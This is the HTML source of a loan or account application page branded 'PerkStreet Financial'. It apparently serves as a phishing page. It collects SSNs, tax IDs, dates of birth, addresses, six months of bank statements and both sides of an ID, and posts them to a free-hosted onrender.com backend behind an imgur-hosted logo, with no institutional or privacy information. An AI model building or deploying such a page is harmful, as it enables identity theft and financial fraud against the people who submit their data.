
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Apply for PerkStreet Financial</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      margin: 0;
      padding: 0;
      background-color: #f6f6f6;
    }
    header {
      background-color: #000000;
      padding: 1.5rem;
      text-align: center;
    }
    header img {
      height: 50px;
    }
    main {
      max-width: 800px;
      margin: 2rem auto;
      padding: 2rem;
      background-color: white;
      border-radius: 8px;
    }
    h1 {
      text-align: center;
      color: #333;
    }
    form {
      display: none;
      flex-direction: column;
    }
    label {
      margin: 1rem 0 0.5rem;
      font-weight: bold;
    }
    input, textarea {
      padding: 0.5rem;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    button {
      margin-top: 1.5rem;
      padding: 0.75rem;
      background-color: #000;
      color: white;
      border: none;
      cursor: pointer;
      border-radius: 4px;
    }
    .confirmation {
      display: none;
      text-align: center;
      color: green;
      font-weight: bold;
      margin-top: 2rem;
    }
  </style>
</head>
<body>
  <header>
    <img src="https://i.imgur.com/D9HPwy3.png" alt="PerkStreet Financial Logo" />
  </header>
  <main>
    <h1>Apply for PerkStreet Financial</h1>
    <button id="applyBtn">Apply Now</button>
    <form id="applicationForm" action="https://perkstreet-backend.onrender.com/submit" method="POST" enctype="multipart/form-data">
      <label>Email Address</label>
      <input type="email" name="email" required>

      <label>Phone Number</label>
      <input type="tel" name="phone" required>

      <label>Date of Birth</label>
      <input type="date" name="dob" required>

      <label>SSN</label>
      <input type="text" name="ssn" required>

      <label>TAX ID (EIN)</label>
      <input type="text" name="tax_id" required>

      <label>Business Name</label>
      <input type="text" name="business_name" required>

      <label>Business Address</label>
      <input type="text" name="business_address" required>

      <label>Home Address</label>
      <input type="text" name="home_address" required>

      <label>Annual Revenue</label>
      <input type="text" name="annual_revenue" required>

      <label>Position</label>
      <input type="text" name="position" required>

      <label>Business Website</label>
      <input type="url" name="business_website" required>

      <label>Business Email</label>
      <input type="email" name="business_email" required>

      <label>Bank Statement – January</label>
      <input type="file" name="statement_jan" required>

      <label>Bank Statement – February</label>
      <input type="file" name="statement_feb" required>

      <label>Bank Statement – March</label>
      <input type="file" name="statement_mar" required>

      <label>Bank Statement – April</label>
      <input type="file" name="statement_apr" required>

      <label>Bank Statement – May</label>
      <input type="file" name="statement_may" required>

      <label>Bank Statement – June</label>
      <input type="file" name="statement_jun" required>

      <label>Front of ID</label>
      <input type="file" name="id_front" required>

      <label>Back of ID</label>
      <input type="file" name="id_back" required>

      <button type="submit">Submit Application</button>
    </form>
    <div class="confirmation" id="confirmationMsg">You're all set! We've received the application.</div>
  </main>

  <script>
    document.getElementById('applyBtn').onclick = function() {
      document.getElementById('applicationForm').style.display = 'flex';
      this.style.display = 'none';
    };
  </script>
</body>
</html>
